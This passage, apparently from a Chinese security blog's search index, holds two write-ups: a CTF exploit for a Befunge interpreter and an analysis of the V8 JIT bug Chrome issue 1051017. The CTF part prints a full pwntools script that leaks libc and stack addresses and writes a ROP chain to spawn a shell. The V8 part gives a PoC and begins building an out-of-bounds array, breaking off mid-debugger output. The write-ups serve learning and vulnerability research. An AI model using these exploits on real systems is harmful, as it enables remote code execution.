–writable-text来实现。因此，有时实在没办法，我们可以尝试一下text段是否可写。\n","categories":["CTF"],"tags":["text段"]},{"title":"interpreter-200","url":"/2020/02/06/interpreter-200/","content":"这是一个befunge程序解释器，befunge程序的语法参考https://www.jianshu.com/p/ed929cf72312，还有官方的文档在https://esolangs.org/wiki/Befunge\n另外本文参考国外的一篇，加以自己的理解，做了简化\nhttps://uaf.io/exploitation/2016/09/05/TokyoWesterns-MMA-Interpreter.html\n首先，检查一下程序的保护机制，发现保护全开\n\n\n然后，我们用IDA分析一下，看似挺复杂，漏洞点在这，数组可以越界\n\n\ng指令是用于获取program+80v26+v27处一个字节数据压入栈里，而p指令用于在program+80v26+v27处写数据，\n\n\n&amp;指令用于从终端读取一个整数压入栈里\n\n\n，指令用于输出栈顶一个字节数据\n借助于这四条指令，我们可以实现任意地址读写。\n首先，我们需要泄露一些数据，因此，我们的befunge指令这样\nmy_program = (&#x27;&#x27;&#x27;&#x27;&#x27;&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&amp;&amp;&amp;*g,&amp;&amp;&amp;*g,AAAv vAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,g*&amp;&amp;&amp;,g*&amp;&amp;&amp;,g*&amp;&amp;&amp;,g*&amp;&amp;&amp;,g*&amp;&amp;&amp;,g*&amp;&amp;&amp;&lt;\\n&#x27;&#x27;&#x27;)  \n\n&amp;&amp;g,表示从终端输入两个数v27,v26，然后输出program+80v26+v27处的一字节数据，由于泄露libc里的数据时，偏移范围[超过了int的范围，因此，我们借助指令]{.mark}**，分步计算，即后面的&amp;&amp;&amp;*g\n当泄露完成后，我们就需要写数据，于是接下来的befunge指令是这样的\nmy_program += &#x27;&gt;&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*pv\\n&#x27;  my_program += &#x27;&lt;&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;gAAAAAAAAAv&#x27;[::-1]  \n\n当我们把befunge指令输入完毕后，后面的操作就是正常的操作的了。按着指令步骤，我们先来泄露一些基本地址\n#消除前面的影响  sh.recv()  #由于下标越界，我们可以泄露exit的got表内容，得到exit的地址  exit_ptr = &#x27;&#x27;  for i in range(-64,-56):     sh.sendline(str(i))     sh.sendline(&#x27;-1&#x27;)     exit_ptr += sh.recv(1)    #泄露program数组的地址，方便我们计算elf_base  program_ptr = &#x27;&#x27;  for i in range(-16,-8):     sh.sendline(str(i))     sh.sendline(&#x27;-1&#x27;)     program_ptr += sh.recv(1)    exit_addr = u64(exit_ptr)  program_addr = u64(program_ptr)  elf_base = program_addr - program_bss  pop_rdi_addr = elf_base + pop_rdi  libc = LibcSearcher(&#x27;exit&#x27;,exit_addr)  libc_base = exit_addr - libc.dump(&#x27;exit&#x27;)  system_addr = libc_base + libc.dump(&#x27;system&#x27;)  binsh_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)  print &#x27;elf_base=&#x27;,hex(elf_base)  print &#x27;libc_base=&#x27;,hex(libc_base)  print &#x27;system_addr=&#x27;,hex(system_addr)  print &#x27;binsh_addr=&#x27;,hex(binsh_addr)  \n\n现在，基本信息已经有了，我们准备写ROP，但是我们不知道ROP该写在哪里，因此，我们还需要泄露栈地址，[如何泄露栈地址？]{.mark}\n在libc中有一个_environ变量存储着栈地址，由于我们已经泄露了libc的基地址，因此我们可以知道_environ的地址，于是，我们需要可以_environ的内容，由于偏移过大，我们拆分，借助befunge的乘法运算\n_environ = &#x27;&#x27;  offset = _environ_ptr - program_addr  #显然,offset_x超出了int的范围，得借助于乘法  &#x27;&#x27;&#x27;&#x27;&#x27;offset_x = offset / 80 offset_y = offset - offset_x*80 &#x27;&#x27;&#x27;  #泄露_environ的值  offset_x1 = offset / 80 / 10000  offset_x2 = 10000  offset_x = offset_x1 * offset_x2  offset_y = offset - offset_x*80  for y in range(offset_y,offset_y+8):     sh.sendline(str(y))     sh.sendline(str(offset_x1))     sh.sendline(str(offset_x2))     _environ += sh.recv(1)    _environ = u64(_environ)  #我们的ROP将写到此处  stack_addr = _environ - 0xF0  \n\n这样，我们就得到了栈地址，然后就是写ROP了，原理一样，我们得借助乘法来偏移位置\noffset = stack_addr - program_addr  write_stack(offset,pop_rdi_addr)  write_stack(offset+8,binsh_addr)  write_stack(offset+16,system_addr)  \n\n综上，我们完整的exp脚本如下\n#coding:utf8  from pwn import *  from LibcSearcher import *    #sh = process(&#x27;./befunge&#x27;)  elf = ELF(&#x27;./befunge&#x27;)  program_bss = 0x202040  pop_rdi = 0x120c  sh = remote(&#x27;111.198.29.45&#x27;,32870)    #写栈数据，8字节  def write_stack(offset,data):     offset_x1 = offset / 80 / 10000     offset_x2 = 10000     offset_x = offset_x1 * offset_x2     offset_y = offset - offset_x*80     for y in range(offset_y,offset_y+8):        d = data &amp; 0xFF        data = data &gt;&gt; 8        sh.sendline(str(d))        sh.sendline(str(y))        sh.sendline(str(offset_x1))        sh.sendline(str(offset_x2))      #这两行用于输入两个数用于计算目标地址，然后泄露目标地址处内容  my_program = (&#x27;&#x27;&#x27;&#x27;&#x27;&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&amp;&amp;g,&amp;&amp;&amp;*g,&amp;&amp;&amp;*g,AAAv vAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,g*&amp;&amp;&amp;,g*&amp;&amp;&amp;,g*&amp;&amp;&amp;,g*&amp;&amp;&amp;,g*&amp;&amp;&amp;,g*&amp;&amp;&amp;&lt;\\n&#x27;&#x27;&#x27;)  #写数据的程序  my_program += &#x27;&gt;&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*pv\\n&#x27;  my_program += &#x27;&lt;&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;gAAAAAAAAAv&#x27;[::-1]  print &#x27;==============================================the befunge program==============================&#x27;  print my_program  print &#x27;==============================================================================================&#x27;  sh.sendlineafter(&#x27;&gt;&#x27;,my_program)    for i in range(23):     sh.sendlineafter(&#x27;&gt;&#x27;,&#x27;&#x27;)    #消除前面的影响  sh.recv()  #由于下标越界，我们可以泄露exit的got表内容，得到exit的地址  exit_ptr = &#x27;&#x27;  for i in range(-64,-56):     sh.sendline(str(i))     sh.sendline(&#x27;-1&#x27;)     exit_ptr += sh.recv(1)    #泄露program数组的地址，方便我们计算elf_base  program_ptr = &#x27;&#x27;  for i in range(-16,-8):     sh.sendline(str(i))     sh.sendline(&#x27;-1&#x27;)     program_ptr += sh.recv(1)    exit_addr = u64(exit_ptr)  program_addr = u64(program_ptr)  elf_base = program_addr - program_bss  pop_rdi_addr = elf_base + pop_rdi  libc = LibcSearcher(&#x27;exit&#x27;,exit_addr)  libc_base = exit_addr - libc.dump(&#x27;exit&#x27;)  system_addr = libc_base + libc.dump(&#x27;system&#x27;)  binsh_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)  print &#x27;elf_base=&#x27;,hex(elf_base)  print &#x27;libc_base=&#x27;,hex(libc_base)  print &#x27;system_addr=&#x27;,hex(system_addr)  print &#x27;binsh_addr=&#x27;,hex(binsh_addr)  print &#x27;pop_rdi_addr=&#x27;,hex(pop_rdi_addr)    #通过上面的libcSearcher，我们确定了libc为2.23版本，所以，我们取libc2.23里面的pop rdi这个gadget  libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)  #泄露_environ的值，我们可以得到栈地址，方便我们确定写ROP的位置  _environ_ptr = libc_base + libc.symbols[&#x27;_environ&#x27;]  _environ = &#x27;&#x27;  offset = _environ_ptr - program_addr  #显然,offset_x超出了int的范围，得借助于乘法  &#x27;&#x27;&#x27;&#x27;&#x27;offset_x = offset / 80 offset_y = offset - offset_x*80 &#x27;&#x27;&#x27;  #泄露_environ的值  offset_x1 = offset / 80 / 10000  offset_x2 = 10000  offset_x = offset_x1 * offset_x2  offset_y = offset - offset_x*80  for y in range(offset_y,offset_y+8):     sh.sendline(str(y))     sh.sendline(str(offset_x1))     sh.sendline(str(offset_x2))     _environ += sh.recv(1)    _environ = u64(_environ)  #我们的ROP将写到此处  stack_addr = _environ - 0xF0  print &#x27;stack_addr&#x27;,hex(stack_addr)  offset = stack_addr - program_addr  write_stack(offset,pop_rdi_addr)  write_stack(offset+8,binsh_addr)  write_stack(offset+16,system_addr)    #getshell  sh.sendline(str(0))  sh.sendline(str(0))  sh.sendline(&#x27;zhaohai&#x27;)    sh.interactive()  ","categories":["CTF"],"tags":["解释器/简易虚拟机","下标越界"]},{"title":"chrome issue 1051017 v8 逃逸","url":"/2021/01/11/issue-1051017/","content":"文章首发于安全KER https://www.anquanke.com/post/id/227284\n0x00 前言chrome issue 1051017是2020年2月公布的一个v8漏洞，该漏洞是在JIT优化时对循环变量的类型估算考虑不周导致的compiler阶段的类型混淆，通过compiler阶段的类型混淆进一步构造OOB溢出。\n0x01 前置知识induction variable指循环中的一个变量，其值在每一次循环迭代过程中增加（或减少）固定的值，也就是循环中的i变量等。有关编译器确定程序中循环变量的算法，可以阅读论文INTERPROCEDURAL INDUCTION VARIABLE ANALYSIS。\n0x02 issue 1051017 分析patch分析diff --git a/src/compiler/typer.cc b/src/compiler/typer.ccindex 14ec856..4e86b96 100644--- a/src/compiler/typer.cc+++ b/src/compiler/typer.cc@@ -847,30 +847,24 @@   DCHECK_EQ(IrOpcode::kLoop, NodeProperties::GetControlInput(node)-&gt;opcode());   DCHECK_EQ(2, NodeProperties::GetControlInput(node)-&gt;InputCount()); -  auto res = induction_vars_-&gt;induction_variables().find(node-&gt;id());-  DCHECK(res != induction_vars_-&gt;induction_variables().end());-  InductionVariable* induction_var = res-&gt;second;-  InductionVariable::ArithmeticType arithmetic_type = induction_var-&gt;Type();   Type initial_type = Operand(node, 0);   Type increment_type = Operand(node, 2); -  const bool both_types_integer = initial_type.Is(typer_-&gt;cache_-&gt;kInteger) &amp;&amp;-                                  increment_type.Is(typer_-&gt;cache_-&gt;kInteger);-  bool maybe_nan = false;-  // The addition or subtraction could still produce a NaN, if the integer-  // ranges touch infinity.-  if (both_types_integer) &#123;-    Type resultant_type =-        (arithmetic_type == InductionVariable::ArithmeticType::kAddition)-            ? typer_-&gt;operation_typer()-&gt;NumberAdd(initial_type, increment_type)-            : typer_-&gt;operation_typer()-&gt;NumberSubtract(initial_type,-                                                        increment_type);-    maybe_nan = resultant_type.Maybe(Type::NaN());+  // If we do not have enough type information for the initial value or+  // the increment, just return the initial value&#x27;s type.+  if (initial_type.IsNone() ||+      increment_type.Is(typer_-&gt;cache_-&gt;kSingletonZero)) &#123;+    return initial_type;   &#125; -  // We only handle integer induction variables (otherwise ranges-  // do not apply and we cannot do anything).-  if (!both_types_integer || maybe_nan) &#123;+  // We only handle integer induction variables (otherwise ranges do not apply+  // and we cannot do anything). Moreover, we don&#x27;t support infinities in+  // &#123;increment_type&#125; because the induction variable can become NaN through+  // addition/subtraction of opposing infinities.+  if (!initial_type.Is(typer_-&gt;cache_-&gt;kInteger) ||+      !increment_type.Is(typer_-&gt;cache_-&gt;kInteger) ||+      increment_type.Min() == -V8_INFINITY ||+      increment_type.Max() == +V8_INFINITY) &#123;     // Fallback to normal phi typing, but ensure monotonicity.     // (Unfortunately, without baking in the previous type, monotonicity might     // be violated because we might not yet have retyped the incrementing@@ -883,14 +877,13 @@     &#125;     return type;   &#125;-  // If we do not have enough type information for the initial value or-  // the increment, just return the initial value&#x27;s type.-  if (initial_type.IsNone() ||-      increment_type.Is(typer_-&gt;cache_-&gt;kSingletonZero)) &#123;-    return initial_type;-  &#125;    // Now process the bounds.+  auto res = induction_vars_-&gt;induction_variables().find(node-&gt;id());+  DCHECK(res != induction_vars_-&gt;induction_variables().end());+  InductionVariable* induction_var = res-&gt;second;+  InductionVariable::ArithmeticType arithmetic_type = induction_var-&gt;Type();+   double min = -V8_INFINITY;   double max = V8_INFINITY; @@ -946,8 +939,8 @@     // The lower bound must be at most the initial value&#x27;s lower bound.     min = std::min(min, initial_type.Min());   &#125; else &#123;-    // Shortcut: If the increment can be both positive and negative,-    // the variable can go arbitrarily far, so just return integer.+    // If the increment can be both positive and negative, the variable can go+    // arbitrarily far.     return typer_-&gt;cache_-&gt;kInteger;   &#125;   if (FLAG_trace_turbo_loop) &#123;diff --git a/test/mjsunit/compiler/regress-1051017.js b/test/mjsunit/compiler/regress-1051017.jsnew file mode 100644index 0000000..16ed22e--- /dev/null+++ b/test/mjsunit/compiler/regress-1051017.js@@ -0,0 +1,34 @@+// Copyright 2020 the V8 project authors. All rights reserved.+// Use of this source code is governed by a BSD-style license that can be+// found in the LICENSE file.++// Flags: --allow-natives-syntax+++function foo1() &#123;+  var x = -Infinity;+  var i = 0;+  for (; i &lt; 1; i += x) &#123;+    if (i == -Infinity) x = +Infinity;+  &#125;+  return i;+&#125;++%PrepareFunctionForOptimization(foo1);+assertEquals(NaN, foo1());+assertEquals(NaN, foo1());+%OptimizeFunctionOnNextCall(foo1);+assertEquals(NaN, foo1());+++function foo2() &#123;+  var i = -Infinity;+  for (; i &lt;= 42; i += Infinity) &#123; &#125;+  return i;+&#125;++%PrepareFunctionForOptimization(foo2);+assertEquals(NaN, foo2());+assertEquals(NaN, foo2());+%OptimizeFunctionOnNextCall(foo2);+assertEquals(NaN, foo2());\n该patch是用于修复ISSUE 1051017漏洞的,该patch的批注如下\nThe bug is that induction variable typing does not take into accountthat the value can become NaN through addition or subtraction ofInfinities. The previous fix incorrectly assumed that this can onlyhappen when the initial value of the loop variable is an Infinity.\n该patch位于src/compiler/typer.cc源文件的Typer::Visitor::TypeInductionVariablePhi函数，从文件名和函数名可以推出，该函数属于JIT编译器的一部分，并且可能是在Typer阶段被调用，且与循环变量(induction variables)有关。\n调试分析为了弄清楚漏洞原理，我们回退到parent版本，编译v8引擎以后进行调试，我们使用其给出的poc进行调试\nfunction foo() &#123;    var x = -Infinity;    var i = 0;    for (; i &lt; 1; i += x) &#123;        if (i == -Infinity) x = +Infinity;    &#125;    return i;&#125;%PrepareFunctionForOptimization(foo);print(Object.is(foo(), NaN));print(Object.is(foo(), NaN));%OptimizeFunctionOnNextCall(foo);print(Object.is(foo(), NaN));\n在该poc中，i就是induction variables，而x就是increment首先Typer::Visitor::TypeInductionVariablePhi设置断点，然后运行poc，来到both_types_integer的判断\n   857   const bool both_types_integer = initial_type.Is(typer_-&gt;cache_-&gt;kInteger) &amp;&amp;   858                                   increment_type.Is(typer_-&gt;cache_-&gt;kInteger); ► 859   bool maybe_nan = false;   860   // The addition or subtraction could still produce a NaN, if the integer   861   // ranges touch infinity.   862   if (both_types_integer) &#123;   863     Type resultant_type =   864         (arithmetic_type == InductionVariable::ArithmeticType::kAddition)───────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────00:0000│ rsp  0x7ffda7688b70 —▸ 0x7ffda7688ba0 —▸ 0x561e3b26eb40 —▸ 0x7f7274ace980 —▸ 0x7f72749fc8f8 ◂— ...01:0008│      0x7ffda7688b78 —▸ 0x7f727414f6f3 ◂— and    al, 102:0010│      0x7ffda7688b80 ◂— 0x003:0018│      0x7ffda7688b88 ◂— 0x100561e3b28c9d004:0020│      0x7ffda7688b90 —▸ 0x561e3b26eb40 —▸ 0x7f7274ace980 —▸ 0x7f72749fc8f8 —▸ 0x7f72744a74a0 ◂— ...05:0028│      0x7ffda7688b98 —▸ 0x561e3b28c9d0 ◂— 0x45e0000000406:0030│      0x7ffda7688ba0 —▸ 0x561e3b26eb40 —▸ 0x7f7274ace980 —▸ 0x7f72749fc8f8 —▸ 0x7f72744a74a0 ◂— ...07:0038│      0x7ffda7688ba8 —▸ 0x7ffda7688bc8 —▸ 0x561e3b26eb40 —▸ 0x7f7274ace980 —▸ 0x7f72749fc8f8 ◂— ...─────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────── ► f 0     7f7274829ec9 v8::internal::compiler::Typer::Visitor::TypeInductionVariablePhi(v8::internal::compiler::Node*)+825   f 1     7f7274822627 v8::internal::compiler::Typer::Visitor::Reduce(v8::internal::compiler::Node*)+2887   f 2     7f7274531c97 v8::internal::compiler::GraphReducer::Reduce(v8::internal::compiler::Node*)+231   f 3     7f72745318b7 v8::internal::compiler::GraphReducer::ReduceTop()+775   f 4     7f72745312b1 v8::internal::compiler::GraphReducer::ReduceNode(v8::internal::compiler::Node*)+209   f 5     7f7274531ba0 v8::internal::compiler::GraphReducer::ReduceGraph()+48   f 6     7f727481b510   f 7     7f727473faad────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────pwndbg&gt; p both_types_integer$8 = true\n因为poc里，induction variablesi初始值为0，属于typer_-&gt;cache_-&gt;kInteger类型，然后incrementx初始值为-Infinity，也属于typer_-&gt;cache_-&gt;kInteger类型，因此，接下来会进入if分支\n   862   if (both_types_integer) &#123;   863     Type resultant_type = ► 864         (arithmetic_type == InductionVariable::ArithmeticType::kAddition)   865             ? typer_-&gt;operation_typer()-&gt;NumberAdd(initial_type, increment_type)   866             : typer_-&gt;operation_typer()-&gt;NumberSubtract(initial_type,   867                                                         increment_type);   868     maybe_nan = resultant_type.Maybe(Type::NaN());   869   &#125;──────────────────────────────────\n执行后，maybe_nan为false，这样程序顺利绕过了下面的if\n// We only handle integer induction variables (otherwise ranges// do not apply and we cannot do anything).if (!both_types_integer || maybe_nan) &#123;  // Fallback to normal phi typing, but ensure monotonicity.  // (Unfortunately, without baking in the previous type, monotonicity might  // be violated because we might not yet have retyped the incrementing  // operation even though the increment&#x27;s type might been already reflected  // in the induction variable phi.)  Type type = NodeProperties::IsTyped(node) ? NodeProperties::GetType(node)                                            : Type::None();  for (int i = 0; i &lt; arity; ++i) &#123;    type = Type::Union(type, Operand(node, i), zone());  &#125;  return type;&#125;\n接下来就开始正式处理循环逻辑了\n  897   double increment_min;  898   double increment_max;  899   if (arithmetic_type == InductionVariable::ArithmeticType::kAddition) &#123;  900     increment_min = increment_type.Min();  901     increment_max = increment_type.Max();► 902   &#125; else &#123;  903     DCHECK_EQ(InductionVariable::ArithmeticType::kSubtraction, arithmetic_type);  904     increment_min = -increment_type.Max();  905     increment_max = -increment_type.Min();  906   &#125;\n由于poc里，i执行的操作是+=，满足条件arithmetic_type == InductionVariable::ArithmeticType::kAddition，因此，increment_min等于-inf，而increment_max等于inf，那么就直接进入下面的else分支，返回typer_-&gt;cache_-&gt;kInteger;类型\nif (increment_min &gt;= 0) &#123;...&#125; else if (increment_max &lt;= 0) &#123;...&#125; else &#123;    // Shortcut: If the increment can be both positive and negative,    // the variable can go arbitrarily far, so just return integer.    return typer_-&gt;cache_-&gt;kInteger;  &#125;\n回到上层调用，最终发现，该函数在v8::internal::compiler::Typer::Run时调用。\npwndbg&gt; return#0  0x00007f72745318b7 in v8::internal::compiler::GraphReducer::ReduceTop (this=0x7ffda768a7a8) at ../../src/compiler/graph-reducer.cc:156156\t  Reduction reduction = Reduce(node);pwndbg&gt; return#0  v8::internal::compiler::GraphReducer::ReduceNode (this=0x7ffda768a7a8, node=0x561e3b26f350) at ../../src/compiler/graph-reducer.cc:6060\t    &#125; else if (!revisit_.empty()) &#123;pwndbg&gt; return#0  0x00007f7274531ba0 in v8::internal::compiler::GraphReducer::ReduceGraph (this=0x7ffda768a7a8) at ../../src/compiler/graph-reducer.cc:8181\tvoid GraphReducer::ReduceGraph() &#123; ReduceNode(graph()-&gt;end()); &#125;pwndbg&gt; return#0  v8::internal::compiler::Typer::Run (this=0x561e3b1baa50, roots=..., induction_vars=0x7ffda768a950) at ../../src/compiler/typer.cc:433433\t  if (induction_vars != nullptr) &#123;\n从以上调试情况来看，我们可以知道Typer::Visitor::TypeInductionVariablePhi函数是在Typer阶段用于确定induction variables循环变量的最终类型的。通过调试知道，JIT编译器认为poc里的这个循环，i最终类型为typer_-&gt;cache_-&gt;kInteger;，然而，在实际的普通js层，测试发现，i最终类型为NaN\nfunction foo() &#123;    var x = -Infinity;    var i = 0;    for (; i &lt; 1; i += x) &#123;        if (i == -Infinity) x = +Infinity;    &#125;    return i;&#125;undefinedfoo()NaN\n由此，可以知道，该漏洞使得JIT层面和普通JS层面对循环变量i的类型判断不一致，也就是在JIT层面有一个类型混淆。\n漏洞修复分析我们来看一下该漏洞是如何被修复的\n-  // We only handle integer induction variables (otherwise ranges-  // do not apply and we cannot do anything).-  if (!both_types_integer || maybe_nan) &#123;+  // We only handle integer induction variables (otherwise ranges do not apply+  // and we cannot do anything). Moreover, we don&#x27;t support infinities in+  // &#123;increment_type&#125; because the induction variable can become NaN through+  // addition/subtraction of opposing infinities.+  if (!initial_type.Is(typer_-&gt;cache_-&gt;kInteger) ||+      !increment_type.Is(typer_-&gt;cache_-&gt;kInteger) ||+      increment_type.Min() == -V8_INFINITY ||+      increment_type.Max() == +V8_INFINITY) &#123;\n主要是在原来这个if里面增加了两个条件，判断 increment_type.Min()和 increment_type.Max()的值\n// We only handle integer induction variables (otherwise ranges// do not apply and we cannot do anything).if (!both_types_integer || maybe_nan) &#123;  // Fallback to normal phi typing, but ensure monotonicity.  // (Unfortunately, without baking in the previous type, monotonicity might  // be violated because we might not yet have retyped the incrementing  // operation even though the increment&#x27;s type might been already reflected  // in the induction variable phi.)  Type type = NodeProperties::IsTyped(node) ? NodeProperties::GetType(node)                                            : Type::None();  for (int i = 0; i &lt; arity; ++i) &#123;    type = Type::Union(type, Operand(node, i), zone());  &#125;  return type;&#125;\n如果两个值分别为 -V8_INFINITY和 +V8_INFINITY，那么经过type = Type::Union(type, Operand(node, i), zone());操作，type类型为NaN与JS层面保持一致。\n0x03 issue 1051017 漏洞利用OOB数组构造首先，在原有的基础上加入一个数组\nfunction opt(index) &#123;    var a = [1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];    var x = -Infinity;    var i = 0;    for (; i &lt; 1; i += x) &#123;        if (i == -Infinity) x = +Infinity;    &#125;    //compiler:Range(1,INF)    //reality:NaN    var x = Math.max(i,1);    return x;&#125;%PrepareFunctionForOptimization(opt);print(Object.is(opt(), NaN));print(Object.is(opt(), NaN));%OptimizeFunctionOnNextCall(opt);print(Object.is(opt(), NaN));\n运行结果并无差异\nroot@ubuntu:~/Desktop/v8/out.gn/x64.debug# ./d8 p.js --allow-natives-syntaxtruetruetrue\n我们查看一下IR图可以发现在Typer阶段，var x = Math.max(i,1);这句已经形成了一个节点为Range(1,inf)我们再来看一下加入修复补丁以后的v8运行的IR图，修复后其值为NaN现在的情况是编译器认为其值为Range(1,INF)，而真实值为NaN\n//compiler:Range(1,INF)//reality:NaNvar x = Math.max(i,1);\n现在，我们需要利用某种方法，使得compiler形成的Range在数组长度之内，而reality真值则实际大于数组长度。考虑做如下运算\n//compiler:Range(-INF,-1)//reality:NaNx = -x; //compiler:Range(-2,-1)//reality:NaNx = Math.max(x,-2);//compiler:Range(-2,-1)//reality:0x &gt;&gt;= 0; \n首先，将区间取反，这样，对于编译器来说是Range(-INF,-1)而真值却为NaN，接下来再用max函数，使得Range估算为(-2,-1),真值却仍然为NaN，然后利用&gt;&gt;运算，&gt;&gt; 0 运算可以使得NaN的值变为0，使得编译器认为Range(-2,-1)，而真值为0。然后，我们查看IR图正如预料的那样，编译器的最终评估为Range(-2,-1)。为了进一步调试真实值的计算过程，我们使用如下代码进行调试\nfunction opt(index) &#123;    var a = [1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];    var x = -Infinity;    var i = 0;    for (; i &lt; 1; i += x) &#123;        if (i == -Infinity) x = +Infinity;    &#125;    //compiler:Range(1,INF)    //reality:NaN    var x = Math.max(i,1); //    //compiler:Range(-INF,-1)    //reality:NaN    x = -x; //    //compiler:Range(-2,-1)    //reality:NaN    x = Math.max(x,-2);    //compiler:Range(-2,-1)    //reality:0    x &gt;&gt;= 0; //    return x;&#125;%PrepareFunctionForOptimization(opt);print(opt(5));%OptimizeFunctionOnNextCall(opt);print(opt(5));%SystemBreak();print(opt(5));\n使用如下参数进行调试\nset args --allow-natives-syntax ./p.js -print-opt-code\n在打印出JIT代码和地址后，我们在JIT代码地址出断点然后调试这里是for循环的逻辑\npwndbg&gt; u rip   0x257b00082b8c    vpsllq xmm3, xmm3, 0x36   0x257b00082b91    vpsrlq xmm3, xmm3, 2   0x257b00082b96    vmovapd xmm1, xmm0   0x257b00082b9a    vmovapd xmm2, xmm0   0x257b00082b9e    jmp    0x257b00082bb4 &lt;0x257b00082bb4&gt;    ↓ ► 0x257b00082bb4    vucomisd xmm3, xmm2   0x257b00082bb8    seta   dl   0x257b00082bbb    movzx  edx, dl   0x257b00082bbe    cmp    edx, 0   0x257b00082bc1    je     0x257b00082be9 &lt;0x257b00082be9&gt;    0x257b00082bc7    cmp    rsp, qword ptr [r13 + 0x60]pwndbg&gt; p $xmm3$14 = &#123;  v4_float = &#123;0, 1.875, 0, 1.875&#125;,   v2_double = &#123;1, 1&#125;,   v16_int8 = &#123;0, 0, 0, 0, 0, 0, -16, 63, 0, 0, 0, 0, 0, 0, -16, 63&#125;,   v8_int16 = &#123;0, 0, 0, 16368, 0, 0, 0, 16368&#125;,   v4_int32 = &#123;0, 1072693248, 0, 1072693248&#125;,   v2_int64 = &#123;4607182418800017408, 4607182418800017408&#125;,   uint128 = 84987514980498058628394346335474548736&#125;pwndbg&gt; p $xmm2$15 = &#123;  v4_float = &#123;0, -nan(0x700000), 0, -nan(0x700000)&#125;,   v2_double = &#123;-inf, -inf&#125;,   v16_int8 = &#123;0, 0, 0, 0, 0, 0, -16, -1, 0, 0, 0, 0, 0, 0, -16, -1&#125;,   v8_int16 = &#123;0, 0, 0, -16, 0, 0, 0, -16&#125;,   v4_int32 = &#123;0, -1048576, 0, -1048576&#125;,   v2_int64 = &#123;-4503599627370496, -4503599627370496&#125;,   uint128 = 340199290171201906239760359964582871040&#125;\n当for循环逻辑结束后，此时查看循环变量i的值\n ► 0x257b00082bf2    vmovapd xmm3, xmm2   0x257b00082bf6    vpcmpeqd xmm4, xmm4, xmm4   0x257b00082bfa    vpsllq xmm4, xmm4, 0x3f   0x257b00082bff    vxorpd xmm0, xmm4, xmm3   0x257b00082c03    vpcmpeqd xmm3, xmm3, xmm3   0x257b00082c07    vpsllq xmm3, xmm3, 0x3e───────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────00:0000│ rsp  0x7ffe9b633928 ◂— 0xc /* &#x27;\\x0c&#x27; */01:0008│      0x7ffe9b633930 ◂— 0x8402:0010│      0x7ffe9b633938 —▸ 0x257b08240cf5 ◂— 0xb90000020a08280103:0018│      0x7ffe9b633940 —▸ 0x257b0825018d ◂— 0xe9080406e908280204:0020│      0x7ffe9b633948 —▸ 0x257b08240cf5 ◂— 0xb90000020a08280105:0028│ rbp  0x7ffe9b633950 —▸ 0x7ffe9b6339b0 —▸ 0x7ffe9b6339d8 —▸ 0x7ffe9b633a40 —▸ 0x7ffe9b633a90 ◂— ...06:0030│      0x7ffe9b633958 —▸ 0x7f23c7e30ad1 (Builtins_InterpreterEntryTrampoline+209) ◂— mov    r14, qword ptr [rbp - 0x18]07:0038│      0x7ffe9b633960 ◂— 0xa /* &#x27;\\n&#x27; */─────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────── ► f 0     257b00082bf2   f 1                c   f 2               84   f 3     257b08240cf5   f 4     257b0825018d   f 5     257b08240cf5   f 6     7ffe9b6339b0   f 7     7f23c7e30ad1 Builtins_InterpreterEntryTrampoline+209────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────pwndbg&gt; p $xmm2$23 = &#123;  v4_float = &#123;0, -nan(0x780000), 0, -nan(0x700000)&#125;,   v2_double = 